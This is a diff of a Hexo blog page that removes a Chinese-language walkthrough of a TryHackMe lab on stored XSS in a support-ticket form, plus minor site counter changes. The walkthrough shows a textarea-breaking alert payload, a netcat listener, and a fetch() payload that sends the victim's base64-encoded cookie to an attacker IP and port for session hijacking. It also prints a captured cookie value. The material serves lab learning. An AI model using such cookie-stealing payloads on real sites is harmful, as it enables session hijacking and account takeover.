-<p>重新创建一个 ticket ，尝试使用<code>&lt;/textarea&gt;hahaha</code>闭合<code>textarea</code>标签，结果如下：</p>
-<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110233248687.png" alt="image-20230110233248687" style="zoom:80%;" />
-
-<p>为了验证我们是否可以运行 JavaScript ，于是接着尝试 payload ：<code>&lt;/textarea&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code>，点击查看对应的 ticket ，出现弹窗：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110233514586.png" alt="image-20230110233514586"></p>
-<p>通过上述操作证实了 XSS 漏洞的存在，接着我们可以通过从另一个用户那里提取的 cookie 信息去劫持他们的登录会话以提高我们的权限。为了做到这一点，我们构建的 payload 需要能够提取用户的 cookie 信息并将其导出到我们选择的另一台web服务器上。首先，我们需要设置监听服务器来接收信息，也就是刚刚提到的“另一台web服务器”。</p>
-<p>使用 <strong>Netcat</strong> 设置监听服务器（攻击者的服务器）：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nlvp 9001</span><br></pre></td></tr></table></figure>
-
-<p>然后就是构建 payload ，格式为：<code>&lt;/textarea&gt;&lt;script&gt;fetch(&#39;http://&#123;URL_OR_IP&#125;?cookie=&#39; + btoa(document.cookie) );&lt;/script&gt;</code>。下面是对 payload 的解析：</p>
-<ul>
-<li><code>&lt;/textarea&gt;</code>标签的作用是闭合。</li>
-<li><code>&lt;script&gt;</code>标签是为了打开一个编写 JavaScript 代码的区域。</li>
-<li><code>fetch()</code>命令的作用是发出 HTTP 请求。</li>
-<li><code>&#123;URL_OR_IP&#125;</code>是 THM 请求捕获器的 URL 或 THM Attackbox 的 IP 地址或你在THM VPN网络上的IP地址。（也就是监听服务器的 IP 地址）</li>
-<li><code>?cookie=</code>是包含受害者 cookie 的查询字符串(query string)。</li>
-<li><code>btoa()</code>命令的作用是对受害者的 cookie 进行 base64编码。</li>
-<li><code>document.cookie</code>用于获取 Acme IT Support 网站上受害者的 cookie 。</li>
-<li><code>&lt;/script&gt;</code>用于关闭 JavaScript 代码区域。</li>
-</ul>
-<p>接下来就是利用具体的 payload 实现 XSS 攻击：创建一个新的 ticket ，填入 payload ：<code>&lt;/textarea&gt;&lt;script&gt;fetch(&#39;http://10.10.43.251:9001?cookie=&#39; + btoa(document.cookie));&lt;/script&gt;</code>，创建完毕后，查看终端，得到结果：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230111100430594.png" alt="image-20230111100430594"></p>
-<p>最后通过 base64 解码得到 cookie 值：<code>4AB305E55955197693F01D6F8FD2D321</code>。</p>
-<p>注：我一开始是使用自己的计算机，通过 openvpn 获取一个IP地址，然后在自己的计算机上进行实验，但是无法监听到结果，后来在浏览器使用 Attackbox ，得到结果。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1633,7 +1495,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">49</span>
+          <span class="site-state-item-count">50</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1682,12 +1544,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">134k</span>
+    <span title="站点总字数">135k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:02</span>
+    <span title="站点阅读时长">2:03</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
